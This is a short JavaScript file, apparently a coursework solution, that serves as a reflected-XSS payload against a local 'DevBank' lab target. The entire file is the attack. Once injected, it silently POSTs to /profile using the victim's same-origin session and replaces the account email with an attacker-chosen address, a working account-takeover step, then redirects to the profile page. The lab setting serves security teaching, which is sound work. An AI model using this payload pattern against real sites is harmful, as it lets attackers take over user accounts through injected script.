// FIT5003 A2 B.2 - Reflected XSS external payload
// Use only against the local DevBank coursework target.

fetch("/profile", {
  method: "POST",
  headers: {
    "Content-Type": "application/x-www-form-urlencoded"
  },
  body: "email=xss-takeover-31260462@example.com",
  credentials: "same-origin"
})
.then(() => {
  window.location = "/profile";
});
